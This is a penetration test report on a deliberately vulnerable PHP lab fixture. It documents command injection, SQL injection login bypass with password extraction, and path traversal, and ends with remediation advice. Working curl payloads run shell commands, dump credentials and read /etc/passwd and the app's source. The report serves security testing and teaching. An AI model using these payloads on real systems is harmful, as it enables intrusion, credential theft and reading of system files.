# Penetration Test Report — 192.168.1.5:8806

**Date:** 2026-11-05
**Scope:** http://192.168.1.5:8806 ONLY (operator-owned canary lab fixture). No other hosts contacted.
**Stack:** Apache/2.4.69 (Debian), PHP/8.2.35, SQLite, Docker container (hostname `4027fd295292`, kernel `6.8.0-100-generic`).
**App:** "CANARY HARNESS v1" — deliberately vulnerable PHP fixture. Sources fully recovered and attached.

**Result: 3/3 vulnerabilities triggered and independently cross-verified.**

---

## Finding 1 — OS Command Injection → RCE as www-data

- **Endpoint:** `GET /cmd.php?file=<inject>`
- **Class:** CWE-78 OS Command Injection (OWASP A03:2021-Injection; MITRE ATT&CK T1059.004 Unix Shell, T1190 Exploit Public-Facing Application)
- **Severity:** **CRITICAL** (unauthenticated pre-auth RCE)
- **Root cause (recovered source `/var/www/html/cmd.php`):**
  `$out = shell_exec('cat /var/www/html/data/' . $f . ' 2>&1');` — `$_GET['file']` unsanitized.

**PoC command:**
```
curl 'http://192.168.1.5:8806/cmd.php?file=x;id'
```
**Raw evidence:**
```
FILE VIEWER
----------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Backtick substitution also executes (`file=x`id`` → command output interpolated into `cat` args), confirming shell interpretation, not echo.

**Full command execution proof (`file=x;uname -a;cat /etc/hostname;ls -la /var/www/html`, evidence/v1_cmd_recon.txt):**
```
Linux 4027fd295292 6.8.0-100-generic #100-Ubuntu SMP PREEMPT_DYNAMIC Tue Jan 13 16:06 UTC 2026 x86_64 GNU/Linux
4027fd295292
<webroot listing: cmd.php, data/, file.php, index.php, login.php>
```

**Cross-verification (independent corroboration between two different sinks):**
```
curl 'http://192.168.1.5:8806/cmd.php?file=x;md5sum /etc/passwd'
→ 969e51277d6f8d0e97a34a6b275a2146  /etc/passwd          (evidence/x1_md5_cmd.txt)

curl 'http://192.168.1.5:8806/file.php?name=../../../../etc/passwd' (file-read sink, Finding 3)
→ saved locally, md5sum → 969e51277d6f8d0e97a34a6b275a2146   (evidence/x2_md5_file.txt)
```
Identical md5 from two independent vulnerability classes = both real, RCE confirmed beyond doubt.

---

## Finding 2 — SQL Injection: Authentication Bypass + Credential Extraction

- **Endpoint:** `POST /login.php` (`user`, `pass`)
- **Class:** CWE-89 SQL Injection (SQLite), auth bypass + UNION data extraction (OWASP A03:2021-Injection, A07:2021-Identification and Authentication Failures; MITRE ATT&CK T1190)
- **Severity:** **HIGH** (unauthenticated admin login, plaintext password dump)
- **Root cause (recovered source `/var/www/html/login.php`):**
  `$q = "SELECT id, user, role FROM users WHERE user='" . $user . "' AND pass='" . $pass . "'";` — string concat, no prepared statement.

**PoC A — login bypass with WRONG password:**
```
curl -X POST --data-urlencode "user=admin'--" --data-urlencode "pass=WRONGPASS" http://192.168.1.5:8806/login.php
```
Raw evidence (evidence/sqli_a.txt):
```
LOGIN OK
WELCOME-ADMIN-FLAG role=admin
row: 1 admin admin
```

**PoC B — UNION-based password extraction:**
```
curl -X POST --data-urlencode "user=x' UNION SELECT id,user,pass FROM users--" --data-urlencode "pass=z" http://192.168.1.5:8806/login.php
```
Raw evidence (evidence/sqli_b.txt):
```
LOGIN OK
WELCOME-ADMIN-FLAG role=S3cretCanary!
row: 1 admin S3cretCanary!
row: 2 guest guest
```
→ Plaintext credentials extracted: `admin:S3cretCanary!`, `guest:guest`.

**PoC C — control (valid creds confirm normal path):**
```
curl -X POST --data-urlencode "user=admin" --data-urlencode "pass=S3cretCanary!" http://192.168.1.5:8806/login.php
→ LOGIN OK / WELCOME-ADMIN-FLAG role=admin   (evidence/sqli_c.txt)
```
Control confirms bypass (PoC A) works without knowing the password — auth bypass, not password reuse.

---

## Finding 3 — Path Traversal: Arbitrary File Read + Full Source Disclosure

- **Endpoint:** `GET /file.php?name=<traversal>`
- **Class:** CWE-22 Path Traversal / Arbitrary File Read (OWASP A01:2021-Broken Access Control; MITRE ATT&CK T1083 File Discovery, T1190)
- **Severity:** **HIGH** (read any www-data-readable file incl. all PHP source, SQLite DB, /etc/passwd)
- **Root cause (recovered source `/var/www/html/file.php`):**
  `$path = '/var/www/html/data/' . $name;` then `readfile($path)` — no canonicalization/basename/jail.
- **Note:** leading `/` in `name` does not reach the sink (concat after fixed prefix); relative traversal works. Depth 4 reaches `/`.

**PoC command:**
```
curl 'http://192.168.1.5:8806/file.php?name=../../../../etc/passwd'
```
Raw evidence (evidence/passwd_via_filephp.txt):
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/games
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
...
```

**Second independent target (verification):**
```
curl 'http://192.168.1.5:8806/file.php?name=../../../../etc/hostname'
→ 4027fd295292   (evidence/v2b_hostname.txt)
```

**Full source disclosure (4 files recovered, evidence/v4b–v7):**
```
name=../cmd.php   → cmd.php source (354 B)
name=../file.php  → file.php source (446 B)
name=../login.php → login.php source (1268 B) — leaks admin:S3cretCanary!, guest:guest
name=../index.php → index.php source (741 B)
```

**Chained impact:** Finding 3 alone yields credentials (source + `data/canary.sqlite`); Finding 1 yields full shell as `uid=33(www-data)` including environment dump (evidence/v3_cmd_env.txt) and file listing (evidence/x3_lsdata.txt: `canary.sqlite` 8192 B, `note.txt`).

---

## Method / Routes

1. Fingerprinted root → advertised endpoints `/cmd.php /login.php /file.php`.
2. Parameter discovery by differential response (12 candidate params × 2 endpoints): `file=` (cmd.php, stderr passthrough leaked `/var/www/html/data//etc/passwd`), `name=` (file.php, distinct "not found" echo), POST `user`/`pass` (login.php).
3. Traversal depth derived from leaked prefix (`/var/www/html/data/` → 4×`../` = `/`; 1×`../` = webroot).
4. Independent verification: distinct payload mechanisms per finding + cross-sink md5 match (RCE vs traversal).

## Evidence Index

| File | Content |
|---|---|
| evidence/v1_cmd_recon.txt | RCE: uname/hostname/ls output |
| evidence/v3_cmd_env.txt | RCE: full environment dump |
| evidence/x1_md5_cmd.txt | RCE: md5sum /etc/passwd |
| evidence/x2_md5_file.txt | matching md5 via traversal sink |
| evidence/x3_lsdata.txt | RCE: webroot + data dir listing |
| evidence/sqli_a.txt | SQLi bypass, WRONG password → LOGIN OK |
| evidence/sqli_b.txt | UNION extraction → plaintext passwords |
| evidence/sqli_c.txt | control: valid creds path |
| evidence/passwd_via_filephp.txt | /etc/passwd via traversal |
| evidence/v2b_hostname.txt | /etc/hostname via traversal |
| evidence/v4b–v6b_*.txt, v7_src_index.txt | all 4 PHP sources |

## Remediation (fixture — for operator record)

1. cmd.php: remove shell execution entirely; if unavoidable, `escapeshellarg($f)` + never concat user input.
2. login.php: `PDO::prepare('SELECT id,user,role FROM users WHERE user=? AND pass=?')` + `execute([$user,$pass])`; store salted hashes, not plaintext.
3. file.php: `basename()` + `realpath()` containment check against the data dir; deny absolute paths and `..`.
4. Suppress stderr passthrough (`2>&1` leak disclosed the filesystem layout).

**Uncertainty:** none on the three findings — each triggered live in this run with captured request/response evidence. `/server-status` returned 403 (not pursued further; out of canary scope). No upload surface exists in the fixture.
